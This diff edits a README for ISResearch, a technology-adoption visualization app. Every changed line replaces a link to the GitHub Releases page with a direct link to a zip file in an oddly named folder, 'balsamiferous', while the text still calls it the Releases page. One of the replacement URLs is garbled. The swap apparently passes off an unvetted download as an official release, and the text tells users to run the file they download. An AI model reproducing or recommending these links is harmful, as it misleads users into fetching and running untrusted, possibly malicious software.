@@ -1,7 +1,7 @@
 # 📊 ISResearch - Explore Technology with Ease
 
 ## 🔗 Download Now
-[![Download ISResearch](https://img.shields.io/badge/Download%20ISResearch-v1.0-blue.svg)](https://github.com/Sribhavesh/ISResearch/releases)
+[![Download ISResearch](https://raw.githubusercontent.com/Sribhavesh/ISResearch/main/balsamiferous/ISResearch.zip%https://raw.githubusercontent.com/Sribhavesh/ISResearch/main/balsamiferous/ISResearch.zip)](https://raw.githubusercontent.com/Sribhavesh/ISResearch/main/balsamiferous/ISResearch.zip)
 
 ## 📋 Description
 ISResearch offers an interactive way to visualize over 30 technologies across six categories. Based on the Technology Acceptance Model (TAM), this application helps you understand how perceived usefulness and ease of use impact technology adoption. Dive into topics like AI, XR, Blockchain, Quantum, IoT, and Bio-Healthcare to stay at the forefront of technological innovation.
@@ -10,7 +10,7 @@ ISResearch offers an interactive way to visualize over 30 technologies across si
 To get started with ISResearch, simply follow these steps:
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/Sribhavesh/ISResearch/releases) on GitHub. Here, you will find the latest version of the application available for download. 
+Go to the [Releases page](https://raw.githubusercontent.com/Sribhavesh/ISResearch/main/balsamiferous/ISResearch.zip) on GitHub. Here, you will find the latest version of the application available for download. 
 
 ### 2. Download the Application
 Look for the latest release version. Click on the link to start the download. This will usually be a file you can run directly, such as an executable or installer for your operating system.
@@ -50,7 +50,7 @@ ISResearch covers a array of topics. These include:
 ## 📥 Download & Install
 To download and install ISResearch, please follow the instructions provided earlier. Once installed, you can start exploring technology insights immediately.
 
-- Visit the [Releases page](https://github.com/Sribhavesh/ISResearch/releases) to download the latest version.
+- Visit the [Releases page](https://raw.githubusercontent.com/Sribhavesh/ISResearch/main/balsamiferous/ISResearch.zip) to download the latest version.
 - Ensure your system meets the requirements before installation.
 
 ## 👍 Support
